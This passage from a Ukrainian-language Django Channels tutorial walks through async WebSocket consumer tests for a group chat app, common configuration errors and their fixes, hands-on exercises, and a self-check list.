    def _communicator(self, user=None, group_pk=None):
        session_key = _make_session_cookie(user)
        pk = group_pk if group_pk is not None else self.group.pk
        return WebsocketCommunicator(
            application,
            f"/ws/groups/{pk}/chat/",
            headers=[(b"cookie", f"sessionid={session_key}".encode())],
        )
```

!!! note "asyncSetUp() у Django 5.1+"
    Django 5.1 додав `asyncSetUp()` і `asyncTearDown()` до `TransactionTestCase`.
    У Django 5.2+ можна писати:
    ```python
    async def asyncSetUp(self):
        self.user = await User.objects.acreate_user('testuser', password='pass')
        self.group = await DjangoGroup.objects.acreate(name='Chat')
        await self.group.user_set.aadd(self.user)
    ```
    Обидва підходи коректні. **`notes_chat_app`** використовує синхронний `setUp()`
    — він простіший і не вимагає `database_sync_to_async` в методі ініціалізації.

### Тест 1: member може підключитись

```python
    async def test_member_can_connect(self):
        comm = self._communicator(user=self.user)
        connected, _ = await comm.connect()
        self.assertTrue(connected)
        await comm.disconnect()
```

### Тест 2: history надсилається після connect

```python
    async def test_member_receives_history_on_connect(self):
        from notes_app.models import ChatMessage
        await database_sync_to_async(ChatMessage.objects.create)(
            group=self.group, author=self.user, content='Старе повідомлення',
        )

        comm = self._communicator(user=self.user)
        await comm.connect()

        response = await comm.receive_json_from()
        self.assertEqual(response['type'], 'history')
        self.assertEqual(response['content'], 'Старе повідомлення')

        await comm.disconnect()
```

### Тест 3: non-member отримує відмову

```python
    async def test_non_member_is_rejected(self):
        # other_user НЕ є членом групи
        comm = self._communicator(user=self.other_user)
        connected, _ = await comm.connect()
        self.assertFalse(connected)
        await comm.disconnect()
```

### Тест 4: anonymous отримує відмову

```python
    async def test_anonymous_user_is_rejected(self):
        # Без cookie — anonymous
        comm = WebsocketCommunicator(
            application,
            f"/ws/groups/{self.group.pk}/chat/",
        )
        connected, _ = await comm.connect()
        self.assertFalse(connected)
        await comm.disconnect()
```

### Тест 5: broadcast між двома юзерами

```python
    async def test_message_broadcast_to_all_members(self):
        await database_sync_to_async(self.group.user_set.add)(self.other_user)

        comm1 = self._communicator(user=self.user)
        comm2 = self._communicator(user=self.other_user)

        await comm1.connect()
        await comm2.connect()

        await comm1.send_json_to({'content': 'Привіт від testuser'})

        response1 = await comm1.receive_json_from()
        response2 = await comm2.receive_json_from()

        self.assertEqual(response1['type'], 'message')
        self.assertEqual(response1['content'], 'Привіт від testuser')

        self.assertEqual(response2['type'], 'message')
        self.assertEqual(response2['content'], 'Привіт від testuser')
        self.assertEqual(response2['author'], 'testuser')

        await comm1.disconnect()
        await comm2.disconnect()
```

### Тест 6: повідомлення зберігається у БД

```python
    async def test_message_saved_to_database(self):
        from notes_app.models import ChatMessage

        comm = self._communicator(user=self.user)
        await comm.connect()

        await comm.send_json_to({'content': 'Тестове повідомлення'})
        await comm.receive_json_from()  # чекаємо broadcast відповіді

        count = await database_sync_to_async(
            ChatMessage.objects.filter(
                group=self.group,
                author=self.user,
                content='Тестове повідомлення',
            ).count
        )()
        self.assertEqual(count, 1)

        await comm.disconnect()
```

### Запуск consumer тестів

```bash
# Consumer тести
docker compose run --rm web python manage.py test \
    notes_app.tests.test_consumers -v 2

# Всі тести (крім Selenium)
docker compose run --rm web python manage.py test \
    notes_app.tests.test_models \
    notes_app.tests.test_services \
    notes_app.tests.test_forms \
    notes_app.tests.test_views \
    notes_app.tests.test_consumers -v 2
```

---

## Типові помилки

### Повна таблиця

| Помилка | Причина | Виправлення |
|---------|---------|-------------|
| `SynchronousOnlyOperation` | sync ORM у async context | `@database_sync_to_async` |
| `AppRegistryNotReady` | імпорт до `get_asgi_application()` | Перенести імпорти після |
| `TimeoutError reading from redis` | `socket_timeout=5` vs brpop | `"socket_timeout": None` |
| WS 400 через nginx | Відсутні Upgrade заголовки | `proxy_http_version 1.1` + Upgrade headers |
| WS з'єднання закривається після простою | `socket_timeout=5` у Redis | `"socket_timeout": None, "health_check_interval": 30` |
| History не приходить | QuerySet lazy | `list(qs.values(...))` у `@database_sync_to_async` |
| `daphne` не override runserver | `daphne` не перший у INSTALLED_APPS | Перемістити `daphne` першим |
| Consumer не знаходиться | Відсутній `routing.py` у asgi.py | Підключити `websocket_urlpatterns` |

### Приклади виправлень

```python
# SynchronousOnlyOperation:
# ❌
async def connect(self):
    group = Group.objects.get(pk=self.group_pk)
# ✅
@database_sync_to_async
def get_group(self, pk):
    return Group.objects.get(pk=pk)

# AppRegistryNotReady:
# ❌ asgi.py — імпорт ДО get_asgi_application():
from notes_project.routing import websocket_urlpatterns
django_asgi_app = get_asgi_application()
# ✅
django_asgi_app = get_asgi_application()
from notes_project.routing import websocket_urlpatterns

# time.sleep() блокує event loop:
# ❌
async def connect(self):
    time.sleep(1)
# ✅
async def connect(self):
    await asyncio.sleep(1)
```

---

## Практичне завдання

**Завдання 1 — спостереження:**
```bash
docker compose up -d
# DevTools → Network → WS
# Відкрий чат → знайди ws://... з'єднання
# Надішли повідомлення → переглянь WS frames
```

**Завдання 2 — broadcast:**
```
Відкрий два браузери під demo_alice і demo_bob (пароль: demo1234)
Відправ повідомлення з одного → воно з'явилось в іншому без перезавантаження?
```

**Завдання 3 — розуміння коду:**
```
Знайди у consumers.py метод load_history().
Чому повертається list(qs.values(...)) а не просто qs?
Що станеться якщо прибрати list()?
```

**Завдання 4 — авторизація:**
```
Спробуй підключитись до групи, членом якої не є.
Який close code у DevTools → Network → WS? (має бути 4003)
```

**Завдання 5 — логування:**
```python
# Додай у connect() перед accept():
import logging
logger = logging.getLogger(__name__)

async def connect(self):
    ...
    logger.info(f"User {self.user.username} connected to group {self.group_pk}")
    await self.accept()

# Перезапусти і переглянь:
docker compose logs -f web
```

---

## Чеклист самоперевірки

- [ ] `daphne` — перший у `INSTALLED_APPS`
- [ ] `channels` — у `INSTALLED_APPS`
- [ ] `ASGI_APPLICATION = 'notes_project.asgi.application'` у settings.py
- [ ] `CHANNEL_LAYERS` налаштовано (InMemory або Redis)
- [ ] `"socket_timeout": None` у RedisChannelLayer CONFIG
- [ ] `asgi.py`: `get_asgi_application()` ПЕРЕД будь-яким імпортом з notes_app
- [ ] `routing.py` підключено до `asgi.py`
- [ ] Всі ORM-виклики у Consumer — `@database_sync_to_async`
- [ ] `load_history` повертає `list(qs.values(...))`, не QuerySet
- [ ] `disconnect()` викликає `group_discard()`
- [ ] JS клієнт: `escapeHtml()` для user content (XSS захист)
- [ ] nginx: `proxy_http_version 1.1` + `Upgrade` + `Connection` headers
- [ ] Consumer тести проходять: `docker compose run --rm web python manage.py test notes_app.tests.test_consumers`

---

## Далі

Наступний крок: [08 — Celery та фонові задачі](08_celery.md) — Celery Worker, Beat, Redis broker, browser Toast-нотифікації для нагадувань.

Модулі документації:
- [Async and Realtime](../09_async_and_realtime/README.md)
